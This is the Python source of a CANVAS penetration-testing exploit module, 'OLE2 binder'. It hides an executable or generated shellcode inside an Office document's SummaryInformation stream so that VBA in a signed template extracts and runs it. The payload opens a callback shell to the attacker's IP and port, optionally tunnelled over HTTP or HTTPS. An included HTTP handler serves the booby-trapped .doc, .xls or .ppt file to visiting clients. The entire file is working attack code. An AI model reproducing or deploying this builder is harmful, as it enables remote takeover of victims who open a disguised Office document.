#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path: sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator, win32shell 
import pelib

import os,struct, base64
from libs.ole2 import *

NAME="OLE2 binder"
DESCRIPTION="It allows us to inject an executable file inside an OLE2 docfile and execute it using VBA."
DOCUMENTATION={}
DOCUMENTATION['Vendor']="Microsoft"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["Date public"] = "10/29/2007"
DOCUMENTATION["TUTORIAL"] = "A free online tutorial is available for this module: http://forum.immunityinc.com/index.php?topic=311.0"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "98","ME","2000","XP","2003" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This module adds an executable file inside a OLE2 docfile, extracts it and execute it using VBA.
Tested under MS Office 97/2000/XP/2007.
You can find the templates under CANVAS_COMPANY/Resources/templates.
IMPORTANT: The templates have to be signed with a trusted certificate to work fully automatically.

To create a new template you have two options:
- Modify one of the default templates (BEFORE signing it), then sign it, and finally execute binder.
- Create your own office file and open the VBA editor (Alt-F11), do the same in our template and copy & paste all the code to the new document.
  Sign this new template and use it as usual.

"""
DOCUMENTATION["Notes"]=NOTES

CHANGELOG="""
8/6/08 - Added support to choose the .exe file to inject

"""

DEBUGNOTES="""
To test from Commandline
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:binder -l 192.168.254.1 -p 8080 -d 5555
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setVersions()
        self.version       = 1
        self.clientversion = None
        self.name          = NAME
        self.filename      = None
        self.exefile       = None

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name
        self.versions[1]=("MS Word file",None)
        self.versions[2]=("MS Excel file",None)
        self.versions[3]=("MS Powerpoint file",None)

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        from shellcode import shellcodeGenerator
        httpWrapper = ""
        try:
            if self.HTTPMOSDEF == True:
                self.log("[!] using HTTP MOSDEF tunneling payload ..")
                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp", {"subespval": 0x1000 })
                sc.addAttr("revert_to_self_before_importing_ws2_32", None)
                
                # this is what you need your exploits to port them to HTTPS MOSDEF compatibility
                if self.useSSLMOSDEF == True:
                    ssl = "s"
                else:
                    ssl = ""
                # end of change
                
                sc.addAttr("httpGetShellcode", {"URL": "http%s://%s:%d"%(ssl, self.callback.ip, self.callback.port)})
                httpWrapper = sc.get()
                self.log("[!] HTTP MOSDEF len: %d bytes"% len(httpWrapper))
        except Exception,msg:
            #print "Exception in HTTP MOSDEF Payload generation: %s" % msg
            httpWrapper = ""

        self.shellcode = self.createInjectToSelf(self.callback.ip, self.callback.port, injectme=httpWrapper)
        self.log("Callback Host/Port: %s/%s"%(self.callback.ip, self.callback.port))    
        pe = pelib.PElib()
        self.shellcode = pe.createPEFileBuf(self.shellcode)
        
        return self.shellcode
   
    def run(self):
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
    
    def makefile(self):
        """Make the OLE2 docfile"""
        self.filename=self.argsDict.get("filename",self.filename)
        self.clientversion=self.argsDict.get("clientversion",self.clientversion)
        if not self.clientversion:
            self.log("client version not found, using version")
            self.clientversion=self.version
        self.clientversion=int(self.clientversion)

        shellcode=None
        self.exefile=self.argsDict.get("exefile",self.exefile)
        if self.exefile:
            try:
                fd = open(self.exefile,'rb')
                shellcode = fd.read()
                fd.close()
            except Exception:
                self.log("It was impossible to open/read the given exefile, using default shellcode")
        if not shellcode:
            shellcode = self.createShellcode()
        
        self.log("using version %s" % self.clientversion)
        from engine.config import canvas_resources_directory
        if   self.clientversion == 1:
            #doc file
            template_file = os.path.join(canvas_resources_directory,"templates","template_cert.doc")
            if not self.filename: self.filename = "binder.doc"
        elif self.clientversion == 2:
            #xls file
            template_file = os.path.join(canvas_resources_directory,"templates","template_cert.xls")
            if not self.filename: self.filename = "binder.xls"
        elif self.clientversion == 3:
            #ppt file
            template_file = os.path.join(canvas_resources_directory,"templates","template_cert.ppt")
            if not self.filename: self.filename = "binder.ppt"
        else:
            return None
        
        doc = OLE2IO()
        doc.open(template_file)
        mydir = doc.getAllDirectory()
        doc_out = OLE2IO()
        doc_out.createOLE2Header(doc.oleheader.getBinaryData())
        
        for did in mydir:
            secname = mydir[did].getName()
        
            if secname.strip("\x00") == "":
                continue
            self.log("stream %s - size %u" % (secname, mydir[did].getSize() ))
            doc_stream=None
            if mydir[did].getSize() > 0:
                if mydir[did].getSize() < doc.getMinimumStreamSize():
                    #in some cases MS decided that the Root Storage Stream is considered a normal stream
                    #no matter the size, so we support this saying the if it cannot be decoded as a
                    #Short Stream, we should try to decode it as a normal one.
                    try:
                        doc_stream = doc.readShortStream(doc.getDirectoryByName(secname).getFirstSID(),doc.getDirectoryByName(secname).getSize())
                    except Exception:
                        doc_stream = doc.readStream(doc.getDirectoryByName(secname).getFirstSID(),doc.getDirectoryByName(secname).getSize())
                else:
                    doc_stream = doc.readStream(doc.getDirectoryByName(secname).getFirstSID(),doc.getDirectoryByName(secname).getSize())
            doc_out.addDirectory(did,doc.getDirectoryByName(secname).getBinaryData())
            
            if secname[1:] == "SummaryInformation":
                #put the file base64 encoded inside the SummaryInformation stream
                data = base64.standard_b64encode(shellcode)
                props = OLE2PropertyStream()
                props.setAllFromBinary(doc_stream)
                self.log("Injecting shellcode, size: %d bytes" % len(data))
                props.addProperty(0,15,30,"STARTSTART" \
                                            + (chr(0)*10) + chr(255) + \
                                            struct.pack("<l", len(data)) + \
                                            data)
                docnew = props.getAllBinary()
                doc_out.addStream(docnew,0,did)
            else:
                if doc_stream:
                    doc_out.addStream(doc_stream,0,did)

        return doc_out.getBinaryData()
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        sploitstring = self.makefile()
        
        #send the exploit
        if self.filename in clientheader.URL:
            self.log("Sending %d bytes"%len(sploitstring))
            h.addHeader("Content-Type","application/octet-stream")
            h.addHeader("Connection","close")
            b.setBody(sploitstring)
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.filename)
                    
        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
